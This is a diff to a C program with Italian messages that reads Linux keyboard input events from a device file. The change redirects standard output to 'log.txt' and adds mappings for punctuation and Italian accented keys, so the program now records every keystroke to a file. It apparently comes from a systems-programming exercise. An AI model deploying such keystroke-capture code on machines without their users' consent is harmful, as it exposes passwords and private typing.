@@ -22,13 +22,24 @@ int main( int argc, char *argv[]){
         exit(2);
     }
 
-    int fd_lettura;
+    int fd_lettura, fd_scrittura;
     fd_lettura = open(argv[1], O_RDONLY);
     if(fd_lettura < 0){
         printf("\nERRORE: apertura del file di lettura %s\n", argv[1]);
         exit(3);
     }
 
+
+    fd_scrittura = open("log.txt", O_RDWR | O_CREAT | O_TRUNC, 0644);
+    if(fd_scrittura < 0){
+        printf("\nERRORE: apertura file di scrittura\n");
+        exit(4);
+    }
+
+    
+    close(1);
+    dup(fd_scrittura);
+    close(fd_scrittura);
 
     printf("\nI caratteri * sono tasti non riconosciuti\n");
 
@@ -135,10 +146,42 @@ int main( int argc, char *argv[]){
         else if(ie.code == KEY_Z){
             printf("Z");
         }
+        else if(ie.code == KEY_COMMA){
+            printf(",");
+        }
+        else if(ie.code == KEY_DOT){
+            printf(".");
+        }
+        else if(ie.code == 12){
+            printf("'");
+        }
+        else if(ie.code == 13){
+            printf("ì");
+        }
+        else if(ie.code == 26){
+            printf("è");
+        }
+        else if(ie.code == 27){
+            printf("+");
+        }
+        else if(ie.code == 28){
+            printf("\n");
+        }
+        else if(ie.code == 39){
+            printf("ò");
+        }
+        else if(ie.code == 40){
+            printf("à");
+        }
+        else if(ie.code == 43){
+            printf("ù");
+        }
+        else if(ie.code == 53){
+            printf("-");
+        }
         else{
             printf("*");
         }
-
 
         fflush(stdout);
         
@@ -146,6 +189,7 @@ int main( int argc, char *argv[]){
 
 
     close(fd_lettura);
+    close(1);
 
     
     return 0;
